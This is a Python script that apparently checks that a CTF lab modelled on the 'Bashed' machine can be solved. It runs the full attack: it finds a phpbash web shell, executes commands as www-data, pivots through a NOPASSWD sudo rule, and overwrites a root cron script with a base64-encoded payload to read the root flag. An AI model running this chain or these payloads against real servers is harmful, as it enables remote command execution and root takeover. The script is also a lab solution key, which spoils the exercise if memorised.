#!/usr/bin/env python3
"""Independent HTTP attacker for original Arrexel/phpbash and the real root cron path."""
import base64
import html
import os
import time
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://bashed-target").rstrip("/")
EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]


def cmd(command):
    data = urllib.parse.urlencode({"cmd": command}).encode()
    request = urllib.request.Request(
        BASE + "/dev/phpbash.php",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(request, timeout=12) as response:
        assert response.status == 200
        return html.unescape(response.read().decode("utf-8", errors="replace"))


home = urllib.request.urlopen(BASE + "/", timeout=8).read().decode()
assert "Bashed" in home
assert "/dev/phpbash.php" not in home
print("PASS: ordinary landing page does not disclose the developer shell", flush=True)

page = urllib.request.urlopen(BASE + "/dev/phpbash.php", timeout=8).read().decode()
assert "sendCommand" in page, "Original Arrexel/phpbash interface missing"
print("PASS: original Arrexel/phpbash discovered", flush=True)

identity = cmd("whoami; id")
assert "www-data" in identity and "uid=33(www-data)" in identity, identity[:500]
print("PASS: authentic phpbash executes as www-data", flush=True)

sudo = cmd("sudo -l")
assert "scriptmanager" in sudo and "NOPASSWD" in sudo, sudo[:700]
scriptmanager = cmd("sudo -u scriptmanager id")
assert "uid=1001(scriptmanager)" in scriptmanager, scriptmanager[:400]
print("PASS: native sudo pivot to scriptmanager", flush=True)

user_flag = cmd("cat /home/arrexel/user.txt").strip()
assert user_flag == EXPECTED_USER_FLAG, "Exact per-instance User Flag mismatch"
assert cmd("test -r /root/root.txt; echo $?").strip().endswith("1")
print("PASS: exact User Flag recovered; Root Flag is not readable before cron path", flush=True)

payload = (
    "import os\n"
    "with open('/tmp/bashed-root-proof','w') as f: f.write(os.popen('/usr/bin/id').read())\n"
    "os.chmod('/tmp/bashed-root-proof', 0o644)\n"
    "with open('/root/root.txt') as src, open('/tmp/bashed-root-flag-proof','w') as dst: dst.write(src.read())\n"
    "os.chmod('/tmp/bashed-root-flag-proof', 0o644)\n"
)
encoded = base64.b64encode(payload.encode()).decode()
cmd("echo " + encoded + " | base64 -d | sudo -u scriptmanager tee /scripts/test.py >/dev/null")
written = cmd("sudo -u scriptmanager cat /scripts/test.py")
assert "bashed-root-proof" in written and "bashed-root-flag-proof" in written, written[:700]
print("PASS: attacker modifies the actual cron-executed script as scriptmanager", flush=True)

# The real root cron executes every *.py file in /scripts once per minute.
# Do not invoke the modified script directly; wait for the scheduled root job.
deadline = time.time() + 125
while time.time() < deadline:
    result = cmd(
        "cat /tmp/bashed-cron-runs 2>/dev/null; "
        "cat /tmp/bashed-root-proof 2>/dev/null; "
        "cat /tmp/bashed-root-flag-proof 2>/dev/null"
    )
    if "uid=0(root)" in result and EXPECTED_ROOT_FLAG in result:
        print("PASS: real root cron executed the modified script and returned exact Root Flag", flush=True)
        break
    time.sleep(3)
else:
    raise AssertionError("Root cron did not execute the modified test.py within 125 seconds")
